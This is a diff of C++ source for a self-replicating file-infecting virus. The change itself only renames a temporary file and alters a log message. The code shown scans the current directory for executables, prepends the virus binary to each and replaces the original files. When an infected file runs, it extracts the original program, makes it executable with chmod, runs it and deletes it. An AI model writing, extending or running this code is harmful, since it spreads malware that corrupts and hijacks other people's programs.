@@ -29,29 +29,29 @@ int main(int argc, char *argv[]){
     cout << "I'm a virus" << endl;
 
     if (size != SIZE){ // Infected file
-        ofstream victim("tmp", ios::binary);
+        ofstream victim("tmpfile", ios::binary);
         self.seekg(SIZE, ios::beg);
         victim << self.rdbuf();
         victim.close();
-        system("chmod +x tmp");
-        system("./tmp");
-        system("rm tmp");
+        system("chmod +x tmpfile");
+        system("./tmpfile");
+        system("rm tmpfile");
     }
     else{ // Seed virus
         for (auto &p : fs::directory_iterator(fs::current_path())){
             if (fs::is_regular_file(p.path()) &&
                 p.path().filename() != argv[0] &&
                 (fs::status(p.path()).permissions() & fs::perms::owner_exec) != fs::perms::none){
-                cout << "Found: " << p.path().string() << endl;
-                string tmp = p.path().string() + ".tmp";
+                cout << "Found to be infected: " << p.path().string() << endl;
+                string tmpfile = p.path().string() + ".tmpfile";
                 ifstream victim(p.path(), ios::binary);
-                ofstream infected(tmp, ios::binary);
+                ofstream infected(tmpfile, ios::binary);
                 infected << self.rdbuf() << victim.rdbuf();
                 infected.close();
                 victim.close();
                 fs::permissions(p.path(), fs::status(p.path()).permissions());
                 remove(p.path().c_str());
-                rename(tmp.c_str(), p.path().c_str());
+                rename(tmpfile.c_str(), p.path().c_str());
             }
         }
     }
